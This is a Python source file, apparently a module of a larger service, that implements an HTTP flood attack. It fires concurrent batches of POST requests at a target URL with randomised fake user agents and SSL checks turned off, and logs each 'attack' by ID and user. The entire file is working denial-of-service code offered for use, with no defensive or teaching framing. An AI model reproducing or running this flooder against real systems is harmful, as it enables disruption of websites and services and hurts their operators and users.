import aiohttp
import asyncio
import random
from fake_useragent import UserAgent
from core.logger import attack_start, attack_summary, attack_warning

ua = UserAgent()

async def send_post(session, url, attack_id=None):
    headers = {
        "User-Agent": ua.random
    }
    try:
        async with session.post(url, headers=headers) as response:
            return response.status
    except Exception as e:
        attack_warning(f"[ID-{attack_id}] Ошибка запроса (POST): {url}")
        return None

async def http_attack(user_id, target_url, num_requests, concurrency=500):
    attack_id = random.randint(1000, 9999)
    attack_start(user_id, attack_id, "http", target_url, num_requests, concurrency, agent=True)

    success = 0
    connector = aiohttp.TCPConnector(ssl=False)
    start = asyncio.get_event_loop().time()

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(num_requests):
            tasks.append(send_post(session, target_url, attack_id))
            if len(tasks) >= concurrency:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success += sum(1 for r in results if r == 200)
                tasks.clear()

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success += sum(1 for r in results if r == 200)

    duration = asyncio.get_event_loop().time() - start
    attack_summary(user_id, attack_id, "http", target_url, success, num_requests, duration)
    return success, num_requests
